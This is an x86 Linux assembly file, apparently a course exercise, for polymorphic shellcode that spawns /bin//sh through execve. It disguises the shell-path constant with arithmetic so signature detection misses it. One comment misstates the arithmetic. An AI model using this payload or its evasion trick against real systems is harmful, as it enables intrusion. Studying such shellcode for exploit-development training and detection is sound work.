; Executable name       : polym
; Designed OS           : Linux (32-bit)
; Author		: wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : An example of execve via polymorphism
;
; Build using these commands:
;       nasm -f elf32 -o polym.o polym.asm
;       ld -o polym polym.o
;       objdump -D polym -M intel
;

SECTION .text

global _start

_start:

	xor eax,eax			; zero out the register
	push eax			; PUSH EAX onto the stack NULLS

	; EXAMPLE 1
;	mov dword [esp-4],0x68732f2f	; /bin//sh
;	mov dword [esp-8],0x6e69622f	; ^

	; EXAMPLE 2
	mov esi,0x57621e1e		; 0x68732f2f dec'd by 1
	add esi,0x11111111		; is 0x57621e1e. so if we
					; add one we get 0x68732f2f

	mov dword [esp-4],esi		; place ESI onto stack (contains 0x68732f2f)
	mov dword [esp-8],0x6e69622f	; and of course add 0x6e69622f

	sub esp,8			; re-adjust stack pointer

	mov al,11                       ; make the execve() syscall

	mov ebx,esp			; MOV the address stored in ESP
					; which points to top of the stack,
					; which points to [<example>][NULLS]

	int 80h				; call the kernel

